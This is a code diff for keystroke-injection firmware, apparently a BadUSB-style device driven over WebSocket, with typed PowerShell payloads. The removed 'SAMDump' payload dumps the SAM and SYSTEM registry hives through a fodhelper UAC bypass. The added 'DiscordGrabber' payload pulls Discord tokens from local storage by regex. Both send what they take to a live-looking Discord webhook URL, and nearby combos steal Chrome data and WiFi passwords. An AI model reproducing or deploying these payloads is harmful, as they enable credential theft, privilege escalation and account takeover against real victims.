@@ -595,8 +595,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] ChromeExfil launched\n");
-      } else if (combo == "SAMDump") {
-        // Exfiltrate SAM & SYSTEM via UAC Bypass to Discord
+      } else if (combo == "DiscordGrabber") {
+        // Exfiltrate Discord Tokens to Webhook
         Keyboard.press(KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
@@ -610,20 +610,21 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
-            "$s=$env:TEMP+'\\s.ps1';"
-            "\\\"Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\\\"\"content\\\"\":\\\"\"=== SAM Dump Initiated ===\\\"\"}'; $t=$env:TEMP+'\\SAM_Backup.zip'; $w=$env:TEMP+'\\r'; mkdir $w -Force; reg save HKLM\\SAM $w'\\sam' /y; reg save HKLM\\SYSTEM $w'\\system' /y; if(Test-Path $w'\\sam'){ Compress-Archive -Path $w\\* -DestinationPath $t -Force; `$h=Get-Item `$t; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form `@{file=`$h}; } Remove-Item $w -Recurse -Force; Remove-Item $t -Force;\\\" > $s;"
-            "$rcmd='powershell -w h -nop -ep bypass -f '+$s;"
-            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
-            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
-            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value $rcmd -Force;"
-            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
-            "Start-Sleep -s 5;"
-            "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
+            "$f=$env:TEMP+'\\d.txt';"
+            "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\\\"content\\\":\\\"=== Discord Grabber Initiated ===\\\"}';"
+            "$p=$env:APPDATA+'\\discord\\Local Storage\\leveldb';"
+            "if(Test-Path $p){"
+            "Get-ChildItem -Path $p -Include *.ldb,*.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}' | ForEach-Object { $_.Matches.Value } | Sort-Object -Unique > $f;"
+            "if(Test-Path $f){"
+            "$h=Get-Item $f;"
+            "try{Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form @{file=$h}}catch{}"
+            "Remove-Item $f -Force}}"
+            "\" & exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
-        LOG("[WebKB] SAMDump launched\n");
+        LOG("[WebKB] DiscordGrabber launched\n");
       } else if (combo == "WiFiHarvest") {
         // Extract all saved WiFi passwords and send to Discord
         Keyboard.press(KEY_LEFT_GUI);
